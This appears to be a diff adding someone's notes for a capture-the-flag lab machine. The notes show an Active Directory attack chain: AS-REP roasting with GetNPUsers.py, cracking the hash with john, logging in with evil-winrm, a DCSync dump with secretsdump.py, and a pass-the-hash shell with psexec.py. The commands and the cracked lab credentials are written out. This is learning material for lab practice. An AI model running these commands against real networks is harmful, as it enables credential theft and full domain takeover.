@@ -1,0 +1,24 @@
+PRE-EXPLOIT
+1] with the analysis of BloodHound we understood that svc_bes user doesn't have PREAUTH (no pass) and can getChangesAll (can hash of password) 
+2] GetNPUsers.py can get the hash of the password of the svc_bes user (GetNPUsers.py megacorp.local/svc_bes -request -no-pass -dc-ip 10.10.10.30) 
+3] save the output in a file and using john (john [OUT_FILE] --format=krb5asrep -wordlist=/usr/share/wordlists/rockyou.txt) for password cracking
+4] we obtained "Sheffield19" as result
+
+				[EXTRA] 
+the fullscan with nmap I've done is not exactly everything I need to continue this machine
+I've not perform a full port scan (flag "-p-") and I've not notice that port 5985 is open.
+with a quick research I've discovered that port 5985 is used for winRM service by default
+winRM = Windows Remote Management ---> allow system to access or exchange data accross the network
+using evil-winrm with the credentials svc_bes:Sheffield19 for obtain user.txt file (svc_bes file)
+ 
+      
+EXPLOIT
+
+0] for perform a DCSync attack we need to use secretdump.py   ---> Dump hashed passwords (need to authenticate with the credentials)
+1] secretsdump.py -dc-ip [IP] [DOMAIN]/[USER]:[PASSWORD]@[IP] ---> secretsdump.py -dc-ip10.10.10.30 MEGACORP.LOCAL/svc_bes:Sheffield19@10.10.10.30
+2] output saved on secrets.txt
+3] using psexec.py to obtain root shell with the flag "-hashes" 
+
+MACHINE COMPLETED 
+
+
